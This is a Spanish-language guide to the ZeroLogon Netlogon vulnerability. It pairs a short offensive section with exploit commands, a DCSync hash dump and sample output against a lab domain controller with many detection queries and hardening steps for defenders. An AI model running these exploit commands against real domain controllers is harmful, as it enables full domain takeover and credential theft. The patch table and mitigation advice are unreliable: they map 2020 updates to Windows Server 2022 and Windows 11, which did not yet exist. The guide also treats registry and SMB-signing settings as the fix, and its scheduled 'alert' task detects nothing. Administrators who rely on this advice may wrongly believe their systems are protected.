# 🛑 ZeroLogon en Active Directory

---

## 📝 ¿Qué es ZeroLogon?

| Concepto      | Descripción                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definición**| ZeroLogon es una vulnerabilidad crítica (CVE-2020-1472) en el protocolo Netlogon de Windows que permite a un atacante sin autenticar obtener privilegios de administrador de dominio a través de la explotación de un fallo en la implementación criptográfica. |
| **Requisito** | El atacante debe tener conectividad de red al controlador de dominio en el puerto 445 (SMB) y conocer el nombre del DC.                |

---

## 🛠️ ¿Cómo funciona el ataque?

| Fase             | Acción                                                                                         |
|------------------|------------------------------------------------------------------------------------------------|
| **Conexión**     | El atacante se conecta al controlador de dominio a través del protocolo Netlogon RPC/SMB.     |
| **Explotación**  | Envía múltiples intentos de autenticación con IV (Initialization Vector) de ceros, aprovechando un fallo en la implementación de AES-CFB8. |
| **Reseteo**      | Al tener éxito, resetea la contraseña de la cuenta de máquina del DC a una cadena vacía.       |
| **Escalada**     | Utiliza las credenciales comprometidas para ejecutar DCSync y volcar todos los hashes del dominio. |
| **Persistencia** | Puede crear cuentas de administrador de dominio o establecer otros métodos de persistencia.     |

---

## 💻 Ejemplo práctico ofensivo (comandos reales)

```bash
# Verificar si el DC es vulnerable a ZeroLogon
python3 zerologon_tester.py DC01 192.168.1.10

# Explotar ZeroLogon para resetear contraseña del DC
python3 cve-2020-1472-exploit.py DC01 192.168.1.10

# Una vez explotado, realizar DCSync para extraer hashes
secretsdump.py -just-dc -no-pass 'DOMAIN/DC01$@192.168.1.10'

# Alternativa con impacket
python3 zerologon.py DC01 192.168.1.10

# Restaurar la contraseña original del DC (importante para estabilidad)
python3 restorepassword.py DOMAIN/administrator@DC01 -target-ip 192.168.1.10 -hexpass [hash_original]
```

```
[*] Testing ZeroLogon vulnerability on DC01...
[*] DC01 appears to be vulnerable to ZeroLogon!
[*] Attempting to exploit...
[*] Success! Machine account password reset.
[*] Performing DCSync attack...
[+] DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

---

## 📊 Detección en logs y SIEM

| Campo clave                   | Descripción                                                                 |
|-------------------------------|----------------------------------------------------------------------------|
| **EventCode = 4624**          | Logon tipo 3 (red) con cuenta de máquina del DC desde IP externa.          |
| **EventCode = 4742**          | Modificación de cuenta de máquina (reseteo de contraseña).                 |
| **EventCode = 4656**          | Acceso a objetos privilegiados (SAM, NTDS) inmediatamente después del reseteo. |
| **EventCode = 4768/4769**     | Solicitudes de tickets Kerberos anómalas con cuenta de máquina.            |
| **EventCode = 5136**          | Modificaciones en el directorio (cambios en cuentas críticas).             |

### Query Splunk básica

```splunk
index=dc_logs sourcetype=WinEventLog:Security (EventCode=4624 OR EventCode=4742 OR EventCode=4656 OR EventCode=4768 OR EventCode=4769)
| where like(Account_Name, "%$") AND Logon_Type=3
| table _time, ComputerName, Account_Name, Source_Network_Address, EventCode
```

---

## 🔎 Queries completas para más investigación

### 1. Detección de reseteo de contraseña de cuenta de máquina

```splunk
index=dc_logs EventCode=4742 
| where like(TargetAccountName, "%$")
| table _time, TargetAccountName, SubjectAccountName, Computer, Source_Network_Address
```

### 2. Accesos RPC/SMB anómalos al DC

```splunk
index=dc_logs EventCode=4624 Logon_Type=3
| where like(Account_Name, "%$") AND Source_Network_Address!="127.0.0.1"
| stats count by _time, Account_Name, Source_Network_Address, Computer
| where count > 10
```

### 3. Solicitudes de tickets Kerberos con cuentas de máquina

```splunk
index=dc_logs (EventCode=4768 OR EventCode=4769)
| where like(Target_User_Name, "%$")
| table _time, Target_User_Name, Client_Address, Service_Name, Result_Code
```

### 4. Detección de DCSync post-explotación

```splunk
index=dc_logs EventCode=4662 Object_Type="domainDNS"
| where like(SubjectAccountName, "%$")
| table _time, SubjectAccountName, Object_Name, Operation_Type, Computer
```

### 5. Múltiples intentos de autenticación fallidos seguidos de éxito

```splunk
index=dc_logs EventCode=4625 OR EventCode=4624
| where like(Account_Name, "%$")
| sort _time
| streamstats count as attempt_number by Account_Name, Source_Network_Address
| where attempt_number > 100
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// ZeroLogon - Detección de intentos de autenticación anómalos
DeviceLogonEvents
| where AccountName endswith "$"
| where ActionType == "LogonFailed"
| summarize FailedAttempts = count() by DeviceId, AccountName, bin(Timestamp, 1m)
| where FailedAttempts > 50
| order by FailedAttempts desc
```

```kql
// Detección de herramientas de explotación de ZeroLogon
DeviceProcessEvents
| where ProcessCommandLine has_any ("zerologon", "CVE-2020-1472", "netlogon", "cve-2020-1472-exploit")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de cambios en contraseñas de cuentas de máquina
DeviceEvents
| where ActionType == "UserAccountModified"
| where AccountName endswith "$"
| where AdditionalFields has "password"
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **Machine Account Auth Spike** | Más de 50 fallos de autenticación de cuenta de máquina en 1 minuto | Crítica |
| **ZeroLogon Exploitation Tools** | Detección de herramientas de explotación conocidas | Crítica |
| **Machine Account Password Reset** | Cambio de contraseña en cuenta de máquina del DC | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de ZeroLogon basado en fallos de autenticación masivos
event_platform=Win event_simpleName=UserLogonFailed
| search UserName=*$ LogonType=3
| bin _time span=1m
| stats count by ComputerName, UserName, _time
| where count > 100
| sort - count
```

```sql
-- Detección de herramientas de ZeroLogon
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*zerologon* OR CommandLine=*CVE-2020-1472* OR FileName=*zerologon*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de conexiones RPC/SMB anómalas al puerto 445
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort=445 LocalPort!=445
| bin _time span=1m
| stats count by ComputerName, RemoteAddressIP4, _time
| where count > 50
| sort - count
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar patrones de ZeroLogon
event_platform=Win event_simpleName=AuthActivityAuditLog
| search UserName=*$ FailureReason=*
| bin _time span=30s
| stats count by ComputerName, UserName, _time
| where count > 25
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de ZeroLogon

```kql
// Query principal para detectar explotación de ZeroLogon
SecurityEvent
| where EventID in (4625, 4624)
| where TargetUserName endswith "$"
| where LogonType == 3
| summarize FailedAttempts = countif(EventID == 4625), SuccessfulAttempts = countif(EventID == 4624) by TargetUserName, IpAddress, bin(TimeGenerated, 1m)
| where FailedAttempts > 100 or (FailedAttempts > 50 and SuccessfulAttempts > 0)
| order by FailedAttempts desc
```

```kql
// Correlación con herramientas de explotación
DeviceProcessEvents
| where ProcessCommandLine contains "zerologon" or ProcessCommandLine contains "CVE-2020-1472"
| join kind=inner (
    SecurityEvent
    | where EventID == 4625 and TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName, IpAddress
) on $left.DeviceName == $right.Computer
| project TimeGenerated, DeviceName, ProcessCommandLine, TargetUserName, IpAddress
```

### Hunting avanzado

```kql
// Detección de cambios en cuentas de máquina tras explotación
SecurityEvent
| where EventID == 4742 // Password change
| where TargetUserName endswith "$"
| join kind=inner (
    SecurityEvent
    | where EventID == 4625 and TargetUserName endswith "$"
    | summarize FailedAttempts = count() by TargetUserName, IpAddress, bin(TimeGenerated, 1h)
    | where FailedAttempts > 100
) on TargetUserName
| where TimeGenerated > TimeGenerated1 and TimeGenerated - TimeGenerated1 < 1h
| project TimeGenerated, Computer, TargetUserName, SubjectUserName, IpAddress, FailedAttempts
```

```kql
// Detección de DCSync post-explotación
SecurityEvent
| where EventID == 4662 // Object access
| where ObjectName contains "domain" and AccessMask == "0x100"
| join kind=inner (
    SecurityEvent
    | where EventID == 4742 and TargetUserName endswith "$"
    | project TimeGenerated, Computer, TargetUserName
) on Computer
| where TimeGenerated > TimeGenerated1 and TimeGenerated - TimeGenerated1 < 2h
| project TimeGenerated, Computer, SubjectUserName, ObjectName, TargetUserName
```

---

## 🦾 Hardening y mitigación

| Medida                                           | Descripción                                                                                 |
|--------------------------------------------------|--------------------------------------------------------------------------------------------|
| **Patchear inmediatamente**                      | Aplicar KB4571723, KB4571748 y todas las actualizaciones posteriores que corrigen CVE-2020-1472. |
| **Habilitar firmado SMB obligatorio**           | `Set-SmbServerConfiguration -RequireSecuritySignature $true -Force` en todos los DCs.     |
| **Monitorización de cuentas de máquina**        | Vigilar eventos 4742 y 4624 tipo 3 con cuentas terminadas en $.                          |
| **Restringir acceso RPC/SMB al DC**             | Limitar conectividad al puerto 445 solo desde sistemas autorizados.                       |
| **Configurar SIEM alertas críticas**            | Alertas inmediatas para reseteos de contraseña de cuentas DC$ y accesos RPC anómalos.     |
| **Auditoría detallada de cambios en cuentas**   | Habilitar auditoría de cambios en cuentas de equipo y servicios críticos.                |

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB4571723** | Windows Server 2019 - Parche crítico principal para CVE-2020-1472 (ZeroLogon).             |
| **KB4571748** | Windows Server 2016 - Correcciones completas del protocolo Netlogon.                       |
| **KB4571694** | Windows Server 2012 R2 - Mitigación esencial de vulnerabilidades criptográficas Netlogon.  |
| **KB4571729** | Windows 10/11 - Protección del cliente contra ataques ZeroLogon.                           |
| **KB4571756** | Windows Server 2022 - Refuerzo de validaciones criptográficas en Netlogon.                 |

### Configuraciones de registro post-parche

```powershell
# Habilitar modo de compatibilidad estricto para Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -Value 1

# Configurar auditoría detallada de Netlogon
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "DBFlag" -Value 0x2080FFFF

# Habilitar logging de eventos de seguridad críticos
auditpol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Other Logon/Logoff Events" /success:enable /failure:enable
```

### Verificación de aplicación de parches

```powershell
# Verificar que los parches ZeroLogon estén instalados
Get-HotFix -Id KB4571723, KB4571748, KB4571694, KB4571729

# Verificar configuración de Netlogon post-parche
$netlogonConfig = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name "RequireStrongKey" -ErrorAction SilentlyContinue
if ($netlogonConfig.RequireStrongKey -eq 1) {
    Write-Host "✓ Netlogon configurado con claves fuertes" -ForegroundColor Green
} else {
    Write-Host "✗ ALERTA: RequireStrongKey no configurado" -ForegroundColor Red
}

# Verificar firmado SMB obligatorio
$smbConfig = Get-SmbServerConfiguration
if ($smbConfig.RequireSecuritySignature) {
    Write-Host "✓ Firmado SMB obligatorio habilitado" -ForegroundColor Green
} else {
    Write-Host "✗ CRÍTICO: Firmado SMB no obligatorio" -ForegroundColor Red
}
```

### Actualizaciones críticas de seguridad relacionadas

- **CVE-2020-1472**: ZeroLogon protocolo Netlogon (KB4571723, KB4571748)
- **CVE-2020-1424**: Elevación de privilegios Netlogon (KB4566424)
- **CVE-2021-26855**: Exchange Server RCE (relacionado si hay Exchange)
- **CVE-2021-34470**: Falsificación de respuesta Netlogon (KB5005408)

### Configuración avanzada de mitigación

```powershell
# Script para configuración defensiva completa
# Configurar políticas de grupo para firmado SMB
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1

# Configurar auditoría avanzada específica para ZeroLogon
auditpol /set /subcategory:"Detailed Directory Service Replication" /success:enable /failure:enable
auditpol /set /subcategory:"Directory Service Access" /success:enable /failure:enable

# Configurar alertas de seguridad en tiempo real
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command 'Send-MailMessage -To admin@company.com -Subject ALERT: Posible ZeroLogon -Body Evento crítico detectado'"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "ZeroLogonAlert" -Action $action -Trigger $trigger
```

---

## 🧑‍💻 ¿Cómo verificar vulnerabilidad sin explotar?

```bash
# Usar scanner sin explotación
python3 zerologon_tester.py [DC_NAME] [DC_IP]

# Verificar con nmap y scripts NSE
nmap -p 445 --script smb-vuln-cve-2020-1472 [DC_IP]

# Verificar configuración desde el propio DC
Get-HotFix | Where-Object {$_.HotFixID -like "*4571*"}
```

---

## 📚 Referencias

- [Microsoft Security Advisory CVE-2020-1472](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472)
- [ZeroLogon - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/zerologon)
- [Secura ZeroLogon Whitepaper](https://www.secura.com/blog/zero-logon)
- [Microsoft Netlogon Elevation of Privilege Vulnerability](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472)